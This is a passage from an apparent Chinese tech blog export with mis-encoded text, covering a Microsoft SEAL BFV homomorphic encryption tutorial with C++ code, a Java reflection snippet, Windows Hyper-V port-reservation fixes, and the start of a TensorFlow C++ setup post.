å¯†æ•°æ®çš„å•ç‹¬çš„å…¬é’¥ï¼Œå’Œä¸€ä¸ªç”¨äºè§£å¯†æ•°æ®çš„å•ç‹¬çš„ç§˜å¯†å¯†é’¥ã€‚ æˆ‘ä»¬éœ€è¦KeyGeneratorç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚æ„é€ å¯†é’¥ç”Ÿæˆå™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¯†é’¥ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ KeyGenerator::create_public_keyä¸ºå®ƒåˆ›å»ºå°½å¯èƒ½å¤šçš„å…¬é’¥ã€‚ ç”¨æ³• å‚æ•° è§£é‡Šè¯´æ˜ KeyGenerator keygen(context); SEALContext åˆ›å»ºä¸€ä¸ªé’¥åŒ™ç”Ÿæˆå™¨ SecretKey secret_key = keygen.secret_key(); åˆ›é€ ä¸€ä¸ªç§é’¥ PublicKey public_key; å£°æ˜ä¸€ä¸ªå…¬é’¥ keygen.create_public_key(public_key); åˆ›é€ ä¸€ä¸ªå…¬é’¥ Encryptor encryptor(); SEALContextï¼ŒPublicKey æ„é€ Encryptorçš„ä¸€ä¸ªå®ä¾‹ Evaluator evaluator(); SEALContext å¯¹å¯†æ–‡çš„è®¡ç®—ä½¿ç”¨Evaluatorç±»æ‰§è¡Œ Decryptor decryptor(); SEALContextï¼ŒSecretKey æ„é€ Decryptorç±»çš„ä¸€ä¸ªå®ä¾‹ Note that KeyGenerator::create_public_key has another overload that takes no parameters and returns a Serializable&lt;PublicKey&gt; object. We will discuss this in &#96;6_serialization.cpp&#39;. ä¸ºäº†èƒ½å¤ŸåŠ å¯†ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ Encryptorçš„ä¸€ä¸ªå®ä¾‹,æ³¨æ„ï¼ŒåŠ å¯†å™¨åªéœ€è¦å…¬é’¥ï¼Œ â€‹ Encryptor encryptor(contest,public_key); å¯¹å¯†æ–‡çš„è®¡ç®—ä½¿ç”¨Evaluatorç±»æ‰§è¡Œ,Evaluatorä¸ä¼šç”±æŒæœ‰å¯†é’¥çš„åŒä¸€æ–¹æ„é€ ã€‚ â€‹ Evaluator evaluator(context); å½“ç„¶ï¼Œæˆ‘ä»¬å¸Œæœ›å¯¹ç»“æœè¿›è¡Œè§£å¯†ï¼Œä»¥éªŒè¯ä¸€åˆ‡å·¥ä½œæ­£å¸¸ï¼Œå› æ­¤è¿˜éœ€è¦æ„é€ Decryptorç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚æ³¨æ„ï¼Œè§£å¯†å™¨éœ€è¦å¯†é’¥ã€‚ â€‹ Decryptor decryptor(context, secret_key); æ¼”ç¤ºcode code Ciphertext x_encrypted; // å¯†æ–‡ encryptor.encrypt(x_plain, x_encrypted); // å°†æ˜æ–‡ x_plain åŠ å¯†è¾“å‡ºåˆ°å¯†æ–‡x_encryptedä¸Š Plaintext x_decrypted; decryptor.decrypt(x_encrypted, x_decrypted); // è§£å¯† å°†åŠ å¯†å¯†æ–‡,è¾“å‡ºè¦†ç›–åˆ°æ˜æ–‡ä¸Š cout &lt;&lt; \"Compute x_sq_plus_one (x^2+1).\" &lt;&lt; endl; Ciphertext x_sq_plus_one; evaluator.square(x_encrypted, x_sq_plus_one); // è®¡ç®—å¹³æ–¹, ç»“æœè¾“å‡ºåˆ° x_sq_plus_one ä¸­ Plaintext plain_one(\"1\"); // æ˜æ–‡ 1 /** åŠ å¯†çš„ä¹˜æ³•å¯¼è‡´è¾“å‡ºå¯†æ–‡çš„å¤§å°å¢åŠ ã€‚ æ›´å‡†ç¡®åœ°è¯´ï¼Œå¦‚æœè¾“å…¥å¯†æ–‡çš„å¤§å°ä¸ºMå’ŒNï¼Œåˆ™è¾“å‡º åŒæ€ä¹˜æ³•åçš„å¯†æ–‡å¤§å°ä¸ºM+N-1ã€‚ **/ çº¿æ€§åŒ– Relinearization `Relinearizationâ€™ is an operation that reduces the size of a ciphertext after multiplication back to the initial size, 2. Thus, relinearizing one or both input ciphertexts before the next multiplication can have a huge positive impact on both noise growth and performance, even though relinearization has a significant computational cost itself. It is only possible to relinearize size 3 ciphertexts down to size 2, so often the user would want to relinearize after each multiplication to keep the ciphertext sizes at 2. Relinearization requires special `relinearization keysâ€™, which can be thought of as a kind of public key. Relinearization keys can easily be created with the KeyGenerator. â€œé‡æ–°çº¿æ€§åŒ–â€æ˜¯ä¸€ç§å‡å°‘å¯†æ–‡å¤§å°çš„æ“ä½œã€‚ ä¹˜æ³•è¿”å›åˆå§‹å¤§å°2ã€‚å› æ­¤ï¼Œé‡æ–°çº¿æ€§åŒ–ä¸€ä¸ªæˆ–ä¸¤ä¸ª ä¸‹ä¸€ä¸ªä¹˜æ³•ä¹‹å‰çš„è¾“å…¥å¯†æ–‡å¯ä»¥å…·æœ‰å¾ˆå¤§çš„æ­£æ•° å³ä½¿é‡æ–°çº¿æ€§åŒ–å·²å¯¹å™ªå£°å¢é•¿å’Œæ€§èƒ½äº§ç”Ÿå½±å“ å·¨å¤§çš„è®¡ç®—æˆæœ¬æœ¬èº«ã€‚ åªèƒ½é‡æ–°çº¿æ€§åŒ– å¤§å°ä¸º3çš„å¯†æ–‡ï¼Œå¤§å°å‡å°ä¸º2ï¼Œå› æ­¤ç”¨æˆ·ç»å¸¸éœ€è¦é‡æ–°çº¿æ€§åŒ– æ¯æ¬¡ä¹˜æ³•åï¼Œå°†å¯†æ–‡å¤§å°ä¿æŒä¸º2ã€‚ é‡æ–°çº¿æ€§åŒ–éœ€è¦ç‰¹æ®Šçš„â€œé‡æ–°çº¿æ€§åŒ–é”®â€ï¼Œå¯ä»¥è®¤ä¸º ä½œä¸ºä¸€ç§å…¬é’¥ã€‚ é‡æ–°çº¿æ€§åŒ–é”®å¯ä»¥è½»æ¾åˆ›å»º KeyGeneratorã€‚ çº¿æ€§åŒ–ç”¨æ³• ç”¨æ³• å‚æ•° è§£é‡Šè¯´æ˜ RelinKeys relin_keys; å£°æ˜çº¿æ€§åŒ–ç±» keygen.create_relin_keys(relin_keys); (RelinKeys) åˆ›å»ºä¸€ä¸ªçº¿æ€§å¯†é’¥ evaluator.relinearize_inplace(x_squared, relin_keys); (Ciphertextï¼ŒRelinKeys) å°†è®¡ç®—ç»“æœé‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†… æ¼”ç¤ºCode code print_line(__LINE__); cout &lt;&lt; \"Compute and relinearize x_squared (x^2),\" &lt;&lt; endl; cout &lt;&lt; string(13, ' ') &lt;&lt; \"then compute x_sq_plus_one (x^2+1)\" &lt;&lt; endl; Ciphertext x_squared; evaluator.square(x_encrypted, x_squared); cout &lt;&lt; \" + size of x_squared: \" &lt;&lt; x_squared.size() &lt;&lt; endl; evaluator.relinearize_inplace(x_squared, relin_keys);// é‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†… cout &lt;&lt; \" + size of x_squared (after relinearization): \" &lt;&lt; x_squared.size() &lt;&lt; endl; evaluator.add_plain(x_squared, plain_one, x_sq_plus_one); // x_sq_plus_one = x_squared + plain_one; cout &lt;&lt; \" + noise budget in x_sq_plus_one: \" &lt;&lt; decryptor.invariant_noise_budget(x_sq_plus_one) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + decryption of x_sq_plus_one: \"; decryptor.decrypt(x_sq_plus_one, decrypted_result); ss2.clear(); ss2 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); ss2 >> d2; cout &lt;&lt; \"Hex: 0x\" &lt;&lt; decrypted_result.to_string() &lt;&lt; \" Integer: \"&lt;&lt;d2&lt;&lt;\" ...... Correct. (x^2 + 1 ) \" &lt;&lt; endl; æºä»£ç  code #include \"seal/seal.h\" #include \"examples.h\" #include &lt;iostream> using namespace std; using namespace seal; int main() &#123; print_example_banner(\"Example: BFV Basics\"); EncryptionParameters parms(scheme_type::bfv); //å£°æ˜HE ä½¿ç”¨çš„æ¨¡å¼ // è®¾ç½® 3 ä¸ªå‚æ•° size_t poly_modulus_degree = 4096; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); parms.set_plain_modulus(1024); // æ˜æ–‡ MODæ•° (2çš„å€æ•°, ç´ æ•°æœ€å¥½) //åˆ›å»ºä¸€ä¸ªcontext SEALContext context(parms); print_line(__LINE__); cout &lt;&lt; \"Set encryption parameters and print\" &lt;&lt; endl; print_parameters(context); cout &lt;&lt; \"Hello World!\"&lt;&lt;endl; cout &lt;&lt; \"Parameter validation (success): \" &lt;&lt; context.parameter_error_message() &lt;&lt; endl; cout &lt;&lt; endl; cout &lt;&lt; \"~~~~~~ A naive way to calculate 4(x^2+1)(x+1)^2. ~~~~~~\" &lt;&lt; endl; KeyGenerator keygen(context); // å¯†é’¥ç±» SecretKey secret_key = keygen.secret_key(); // åˆ›å»ºç§é’¥ PublicKey public_key; keygen.create_public_key(public_key); // åˆ›å»ºå…¬é’¥ Encryptor encryptor(context, public_key);// åŠ å¯†ç±»,åªéœ€è¦å…¬é’¥å³å¯; Evaluator evaluator(context); // è¯„ä¼°è®¡ç®—ç±» Decryptor decryptor(context, secret_key); // è§£å¯†ç±» /** 4x^4 + 8x^3 + 8x^2 + 8x + 4 **/ print_line(__LINE__); int x = 6; Plaintext x_plain(to_string(x)); //x_plain.to_string() è½¬æ¢æˆ16è¿›åˆ¶è¾“å‡º cout &lt;&lt; \"Express x = \" + to_string(x) + \" as a plaintext polynomial 0x\" + x_plain.to_string() + \".\" &lt;&lt; endl; print_line(__LINE__); Ciphertext x_encrypted;// å¯†æ–‡ç±» cout &lt;&lt; \"Encrypt x_plain to x_encrypted.\" &lt;&lt; endl; encryptor.encrypt(x_plain, x_encrypted); cout &lt;&lt; \" + size of freshly encrypted x: \" &lt;&lt; x_encrypted.size() &lt;&lt; endl; /* There is plenty of noise budget left in this freshly encrypted ciphertext. å™ªå£°é¢„ç®—ï¼Œå½“å™ªéŸ³é¢„ç®—é™ä½åˆ°0çš„æ—¶å€™ï¼Œè®¡ç®—ç»“æœä¸æ­£ç¡® */ cout &lt;&lt; \" + noise budget in freshly encrypted x: \" &lt;&lt; decryptor.invariant_noise_budget(x_encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; Plaintext x_decrypted; cout &lt;&lt; \" + decryption of x_encrypted: \"; decryptor.decrypt(x_encrypted, x_decrypted); cout &lt;&lt; \"0x\" &lt;&lt; x_decrypted.to_string() &lt;&lt; \" ...... Correct.\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Compute x_sq_plus_one (x^2+1).\" &lt;&lt; endl; Ciphertext x_sq_plus_one; evaluator.square(x_encrypted, x_sq_plus_one); // è®¡ç®—å¹³æ–¹, ç»“æœè¾“å‡ºåˆ° x_sq_plus_one ä¸­ Plaintext plain_one(\"1\"); // æ˜æ–‡ 1 evaluator.add_plain_inplace(x_sq_plus_one, plain_one); // x_sq_plus_one = x_sq_plus_one + plain_one /** åŠ å¯†çš„ä¹˜æ³•å¯¼è‡´è¾“å‡ºå¯†æ–‡çš„å¤§å°å¢åŠ ã€‚ æ›´å‡†ç¡®åœ°è¯´ï¼Œå¦‚æœè¾“å…¥å¯†æ–‡çš„å¤§å°ä¸ºMå’ŒNï¼Œåˆ™è¾“å‡º åŒæ€ä¹˜æ³•åçš„å¯†æ–‡å¤§å°ä¸ºM+N-1ã€‚ **/ cout &lt;&lt; \" + size of x_sq_plus_one: \" &lt;&lt; x_sq_plus_one.size() &lt;&lt; endl; cout &lt;&lt; \" + noise budget in x_sq_plus_one: \" &lt;&lt; decryptor.invariant_noise_budget(x_sq_plus_one) &lt;&lt; \" bits\" &lt;&lt; endl; /* * è®¡ç®—4ä¸ªå¤šé¡¹å¼æ ·ä¾‹ * 4x^4 + 8x^3 + 8x^2 + 8x + 4 * 4x^4 + 8x^3 + 8x^2 + 8x + 4 = 4(x + 1)^2 * (x^2 + 1) è½¬æ¢æˆ 4(x + 1)^2 * (x^2 + 1) é™ä½å¤šé¡¹å¼ç³»æ•° */ stringstream ss2;//å­—ç¬¦ä¸²æµ ,åšå­—ç¬¦è½¬æ¢ç”¨ int d2; // å¯†æ–‡è®¡ç®—(x^2+1) çš„è§£å¯†ç»“æœä¸º: Plaintext decrypted_result; cout &lt;&lt; \" + decryption of x_sq_plus_one : \"; decryptor.decrypt(x_sq_plus_one, decrypted_result); ss2.clear(); ss2 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); // åå…­è¿›åˆ¶è¾“å‡ºåˆ°ss2ï¼Œ ss2 >> d2; // ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2 cout &lt;&lt; \"HEX: 0x\" &lt;&lt; decrypted_result.to_string() &lt;&lt; \" Integer: \" &lt;&lt; d2 &lt;&lt; \" .... Correct. \" &lt;&lt; endl; /* æ¥ç€å¯†æ–‡è®¡ç®— (x + 1)^2. */ print_line(__LINE__); cout &lt;&lt; \"Compute x_plus_one_sq ((x+1)^2).\" &lt;&lt; endl; Ciphertext x_plus_one_sq; evaluator.add_plain(x_encrypted, plain_one, x_plus_one_sq); //å¯†æ–‡ x_plus_one_sq = x_encrypted + plain_one (x+1) evaluator.square_inplace(x_plus_one_sq); // x_plus_one_sq = x_plus_one_sq * x_plus_one_sq; cout &lt;&lt; \" + size of x_plus_one_sq: \" &lt;&lt; x_plus_one_sq.size() &lt;&lt; endl; cout &lt;&lt; \" + noise budget in x_plus_one_sq: \" &lt;&lt; decryptor.invariant_noise_budget(x_plus_one_sq) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + decryption of x_plus_one_sq: \"; decryptor.decrypt(x_plus_one_sq, decrypted_result); ss2.clear(); ss2 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); // åå…­è¿›åˆ¶è¾“å‡ºåˆ°ss2ï¼Œ ss2 >> d2; // ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2 cout&lt;&lt;\"Hex: Ox\"&lt;&lt;decrypted_result.to_string()&lt;&lt;\" Integer: \"&lt;&lt;d2&lt;&lt;\" .... Correct. \" &lt;&lt; endl; /* æœ€ç»ˆè®¡ç®— (x^2 + 1) * (x + 1)^2 * 4. */ print_line(__LINE__); cout &lt;&lt; \"Compute encrypted_result (4(x^2+1)(x+1)^2).\" &lt;&lt; endl; Ciphertext encrypted_result; Plaintext plain_four(\"4\"); evaluator.multiply_plain_inplace(x_sq_plus_one, plain_four); // x_sq_plus_one = x_sq_plus_one * 4; evaluator.multiply(x_sq_plus_one, x_plus_one_sq, encrypted_result); // å¯†æ–‡encrypted_result = x_sq_plus_one * x_plus_one_sq ; cout &lt;&lt; \" + size of encrypted_result: \" &lt;&lt; encrypted_result.size() &lt;&lt; endl; cout &lt;&lt; \" + noise budget in encrypted_result: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_result) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \"NOTE: Decryption can be incorrect if noise budget is zero.\" &lt;&lt; endl; cout &lt;&lt; endl; cout &lt;&lt; \"~~~~~~ A better way to calculate 4(x^2+1)(x+1)^2. ~~~~~~\" &lt;&lt; endl; decryptor.decrypt(encrypted_result, decrypted_result); stringstream ss3; ss3.clear(); ss3 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); ss3 >> d2; // ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2 cout &lt;&lt; d2 &lt;&lt; \" \" &lt;&lt; decrypted_result.to_string() &lt;&lt; endl; // å¾—åˆ°çš„ç»“æœä¸æ­£ç¡® /* * åˆ©ç”¨Relinearization çº¿æ€§åŒ– å¯¹è¿ç®—è¿›è¡Œä¼˜åŒ– */ print_line(__LINE__); cout &lt;&lt; \"Generate relinearization keys.\" &lt;&lt; endl; RelinKeys relin_keys; // åšçº¿æ€§åŒ–ç±» keygen.create_relin_keys(relin_keys); // åˆ›å»ºçº¿æ€§åŒ–å¯†é’¥ /* We now repeat the computation relinearizing after each multiplication. æˆ‘ä»¬åœ¨æ¯æ¬¡ä¹˜æ³•ä¹‹åé‡å¤é‡æ–°çº¿æ€§åŒ–çš„è®¡ç®—ã€‚ */ print_line(__LINE__); cout &lt;&lt; \"Compute and relinearize x_squared (x^2),\" &lt;&lt; endl; cout &lt;&lt; string(13, ' ') &lt;&lt; \"then compute x_sq_plus_one (x^2+1)\" &lt;&lt; endl; Ciphertext x_squared; evaluator.square(x_encrypted, x_squared); cout &lt;&lt; \" + size of x_squared: \" &lt;&lt; x_squared.size() &lt;&lt; endl; evaluator.relinearize_inplace(x_squared, relin_keys);// é‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†… cout &lt;&lt; \" + size of x_squared (after relinearization): \" &lt;&lt; x_squared.size() &lt;&lt; endl; evaluator.add_plain(x_squared, plain_one, x_sq_plus_one); // x_sq_plus_one = x_squared + plain_one; cout &lt;&lt; \" + noise budget in x_sq_plus_one: \" &lt;&lt; decryptor.invariant_noise_budget(x_sq_plus_one) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + decryption of x_sq_plus_one: \"; decryptor.decrypt(x_sq_plus_one, decrypted_result); ss2.clear(); ss2 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); ss2 >> d2; cout &lt;&lt; \"Hex: 0x\" &lt;&lt; decrypted_result.to_string() &lt;&lt; \" Integer: \"&lt;&lt;d2&lt;&lt;\" ...... Correct. (x^2 + 1 ) \" &lt;&lt; endl; print_line(__LINE__); Ciphertext x_plus_one; cout &lt;&lt; \"Compute x_plus_one (x+1),\" &lt;&lt; endl; cout &lt;&lt; string(13, ' ') &lt;&lt; \"then compute and relinearize x_plus_one_sq ((x+1)^2).\" &lt;&lt; endl; evaluator.add_plain(x_encrypted, plain_one, x_plus_one);// x_plus_one = x_encrypted + plain_one; evaluator.square(x_plus_one, x_plus_one_sq);// x_plus_one_sq = x_plus_one * x_plus_one; cout &lt;&lt; \" + size of x_plus_one_sq: \" &lt;&lt; x_plus_one_sq.size() &lt;&lt; endl; evaluator.relinearize_inplace(x_plus_one_sq, relin_keys); // å¤§å°çº¿æ€§ä¼˜åŒ–åˆ°2å†… cout &lt;&lt; \" + noise budget in x_plus_one_sq: \" &lt;&lt; decryptor.invariant_noise_budget(x_plus_one_sq) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + decryption of x_plus_one_sq: \"; ss3.clear(); decryptor.decrypt(x_plus_one_sq, decrypted_result); ss3&lt;&lt; hex &lt;&lt; decrypted_result.to_string(); ss3 >> d2; cout &lt;&lt; \"Hex: 0x\" &lt;&lt; decrypted_result.to_string() &lt;&lt; \" Integer: \"&lt;&lt;d2&lt;&lt;\" ...... Correct.\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Compute and relinearize encrypted_result (4(x^2+1)(x+1)^2).\" &lt;&lt; endl; evaluator.multiply_plain_inplace(x_sq_plus_one, plain_four); // x_sq_plus_one = x_sq_plus_one * plain_four evaluator.multiply(x_sq_plus_one, x_plus_one_sq, encrypted_result);// encrypted_result = x_sq_plus_one * x_plus_one_sq cout &lt;&lt; \" + size of encrypted_result: \" &lt;&lt; encrypted_result.size() &lt;&lt; endl; evaluator.relinearize_inplace(encrypted_result, relin_keys); // çº¿æ€§ä¼˜åŒ– cout &lt;&lt; \" + size of encrypted_result (after relinearization): \" &lt;&lt; encrypted_result.size() &lt;&lt; endl; cout &lt;&lt; \" + noise budget in encrypted_result: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_result) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; endl; cout &lt;&lt; \"NOTE: Notice the increase in remaining noise budget.\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Decrypt encrypted_result (4(x^2+1)(x+1)^2).\" &lt;&lt; endl; ss3.clear(); decryptor.decrypt(encrypted_result, decrypted_result); ss3 &lt;&lt; hex &lt;&lt; decrypted_result.to_string(); ss3 >> d2; cout &lt;&lt; \" + decryption of 4(x^2+1)(x+1)^2 ,after Mod = Hex: 0x\" &lt;&lt; decrypted_result.to_string() &lt;&lt; \" Integer:\" &lt;&lt; d2 &lt;&lt; \" ...... Correct.(4(x^2+1)(x+1)^2)\" &lt;&lt; endl; /* * å¯¹äº x=6, 4(x^2+1)(x+1)^2 = 7252. å› ä¸º plaintext modulus MODè¢«è®¾ç½®ä¸º 1024, * æ‰€ä»¥ç»“æœ%1024.æ•… 7252 % 1024 == 84, æˆ–è€…16è¿›åˆ¶ï¼š 0x54 */ print_line(__LINE__); cout &lt;&lt; \"An example of invalid parameters\" &lt;&lt; endl; parms.set_poly_modulus_degree(2048); context = SEALContext(parms); print_parameters(context); cout &lt;&lt; \"Parameter validation (failed): \" &lt;&lt; context.parameter_error_message() &lt;&lt; endl &lt;&lt; endl; return 0; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"Javaåå°„æŠ€æœ¯æ‹¿å–å’Œè®¾ç½®Objectå®ä½“ç±»ä¸­çš„å±æ€§","slug":"Javaåå°„æŠ€æœ¯æ‹¿å–å’Œè®¾ç½®Objectå®ä½“ç±»ä¸­çš„å±æ€§","date":"2021-08-11T14:01:20.000Z","updated":"2021-09-19T10:13:55.343Z","comments":true,"path":"posts/c57ba29d/","link":"","permalink":"https://www.sizaif.com/posts/c57ba29d/","excerpt":"","text":"[TOC] @auther by sizaif è¯´æ˜ åœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ä½¿ç”¨PageHelperæ’ä»¶æ‹¿åˆ°çš„æ•°æ®å°è£…åœ¨ PageInfoä¸­,è€ŒæŸäº›æ“ä½œéœ€è¦æ‹¿åˆ°é‡Œé¢çš„å€¼å’Œè®¾ç½®ä¸€äº›å€¼,ç”±äºObjectçš„ç¼˜æ•…,æ— æ³•ç›´æ¥getå’Œset,æ‰€æœ‰ä½¿ç”¨javaåå°„æ¥getå’Œset for (Object contestVO : pageInfo.getList()) &#123; .....XXXXX..... &#125; æ‹¿å±æ€§çš„å€¼ /** * æ ¹æ®å±æ€§åè·å–å±æ€§å€¼ * * @param è¦æ‹¿å–çš„å±æ€§çš„åç§° * @param å®ä½“ç±» * @return */ private static String getFieldValueByFieldName(String fieldName, Object object) &#123; try &#123; Field field = object.getClass().getDeclaredField(fieldName); //è®¾ç½®å¯¹è±¡çš„è®¿é—®æƒé™ï¼Œä¿è¯å¯¹privateçš„å±æ€§çš„è®¿é—® field.setAccessible(true); return (String)field.get(object); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; è®¾ç½® /** * æ ¹æ®å±æ€§åè®¾ç½®å±æ€§å€¼ * * @param è¦è®¾ç½®çš„å±æ€§åç§° * @param å®ä½“ç±» * @param å¯¹äºè¦è®¾ç½®çš„å±æ€§ç±»å‹ * @return */ private static void setFieldValueByFieldName(String fieldName, Object object, å¯¹äºè¦è®¾ç½®çš„å±æ€§ç±»å‹ value) &#123; try &#123; // è·å–objç±»çš„å­—èŠ‚æ–‡ä»¶å¯¹è±¡ Class aClass = object.getClass(); // è·å–è¯¥ç±»çš„æˆå‘˜å˜é‡ Field field = aClass.getDeclaredField(fieldName); // å–æ¶ˆè¯­è¨€è®¿é—®æ£€æŸ¥ field.setAccessible(true); // ç»™å˜é‡èµ‹å€¼ field.set(object, value); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"}],"author":"sizaif"},{"title":"è§£å†³ Win10 Hyper-v ä¿ç•™ç«¯å£å ç”¨é—®é¢˜","slug":"è§£å†³-win10-hyper-v-ä¿ç•™ç«¯å£å ç”¨é—®é¢˜","date":"2021-08-11T01:31:53.000Z","updated":"2021-09-19T10:14:21.978Z","comments":true,"path":"posts/f8215b18/","link":"","permalink":"https://www.sizaif.com/posts/f8215b18/","excerpt":"","text":"è§£å†³ win10 hyper-v ä¿ç•™ç«¯å£å ç”¨é—®é¢˜ [TOC] æŸ¥æ‰¾é—®é¢˜ é¦–å…ˆï¼Œæ£€æŸ¥ç«¯å£å ç”¨ # powershell netstat -ano | findstr \":8080\" æ²¡æœ‰ç»“æœï¼Œæ„å‘³ç€å¹¶ä¸æ˜¯æœ‰ç¨‹åºå ç”¨äº†ç«¯å£ã€‚ çŒœæµ‹å¯èƒ½æ˜¯æ›´æ–°äº†win10 2004ï¼Œå¯¼è‡´win10é˜²ç«å¢™é…ç½®æœ‰å˜æ›´ï¼Œåˆæ£€æŸ¥äº†ä¸€ç•ªwin10é˜²ç«å¢™ï¼Œå‘ç°å¹¶æ²¡æœ‰æ‹¦æˆªæˆ–è€…ç«¯å£ç¦ç”¨çš„é…ç½®ã€‚æ­¤æ—¶ï¼Œæˆ‘æ‰æƒ³èµ·å¥½åƒå…ˆå‰å¼€å¯äº†hyper-vï¼Œæœ€åæœç´¢äº†ä¸€ç•ªï¼Œæ‰¾åˆ°äº†å‡ºç°é—®é¢˜çš„åœ°æ–¹ï¼š code # powershell # æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤ç«¯å£å ç”¨è®¿é—® netsh int ipv4 show dynamicport tcp åè®® tcp åŠ¨æ€ç«¯å£èŒƒå›´ --------------------------------- å¯åŠ¨ç«¯å£ : 1024 ç«¯å£æ•° : 13977 # æŸ¥çœ‹hyper-vå¯åŠ¨åçš„ä¿ç•™ç«¯å£èŒƒå›´ netsh interface ipv4 show excludedportrange protocol=tcp åè®® tcp ç«¯å£æ’é™¤èŒƒå›´ å¼€å§‹ç«¯å£ ç»“æŸç«¯å£ ---------- -------- 1026 1125 1226 1325 1326 1425 1426 1525 1526 1625 2180 2279 ... # é€šè¿‡è¿™ä¸ªå¯ä»¥æŸ¥çœ‹è¢«å ç”¨çš„é¡¹ç›®ç«¯å£æ˜¯å¦åœ¨è¿™ä¸ªèŒƒå›´å†… è§£å†³åŠæ³• ç”±äºç›´æ¥è¿›è¡Œç¬¬äºŒæ­¥é…ç½®ï¼Œä¼šé‡åˆ°ç¨‹åºå ç”¨(hyper-vå ç”¨)ï¼Œæ‰€ä»¥éœ€è¦å…ˆå…³é—­hyper-vï¼Œ å¯ä»¥win+s å¿«æ·é”®æœç´¢ â€œwindowsåŠŸèƒ½â€ ï¼Œå…³é—­hyper-vï¼Œæˆ–è€…ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤ï¼Œç„¶åé‡å¯ # powershell / cmd dism.exe /Online /Disable-Feature:Microsoft-Hyper-V é…ç½®ipv4åŠ¨æ€ç«¯å£ / æˆ–è€…é…ç½®éœ€è¦çš„ç«¯å£ä¸è¢«å ç”¨ # powershell / cmd ç®¡ç†å‘˜æƒé™ # start èµ·å§‹ç«¯å£ num è¡¨ç¤ºå¯ç”¨ç«¯å£æ•° æŒ‰è‡ªå·±çš„éœ€æ±‚æ¥ netsh int ipv4 set dynamicport tcp start=30000 num=16383 # æ’é™¤ipv4åŠ¨æ€ç«¯å£å ç”¨ startport èµ·å§‹ç«¯å£ numberofports ç«¯å£æ•° netsh int ipv4 add excludedportrange protocol=tcp startport=50051 numberofports=1 é‡å¯hyper-v å‘½ä»¤æˆ–é…ç½®çª—å£(å‚è€ƒ1 dism.exe /Online /Enable-Feature:Microsoft-Hyper-V /All","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"}],"tags":[{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/tags/Win/"},{"name":"Hyper-v","slug":"Hyper-v","permalink":"https://www.sizaif.com/tags/Hyper-v/"}],"author":"sizaif"},{"title":"VS2019å¹³å°å¼•å…¥C++ç‰ˆtensorflowé‡åˆ°çš„ä¸€äº›é—®é¢˜åŠè§£å†³æ–¹æ³•","slug":"VS2019å¹³å°å¼•å…¥C-ç‰ˆtensorflowé‡åˆ°çš„ä¸€äº›é—®é¢˜åŠè§£å†³æ–¹æ³•","date":"2021-08-11T01:23:38.000Z","updated":"2021-08-14T14:15:24.000Z","comments":true,"path":"posts/54fe9f8f/","link":"","permalink":"https://www.sizaif.com/posts/54fe9f8f/","excerpt":"","text":"VS2019å¹³å°å¼•å…¥C++ç‰ˆtensorflowé‡åˆ°çš„ä¸€äº›é—®é¢˜åŠè§£å†³æ–¹æ³• [TOC] å®‰è£…tensorflow æˆ‘é‡‡ç”¨çš„æ˜¯å·²ç¼–è¯‘å¥½çš„tensorflow ä¸‹è½½tensorflow 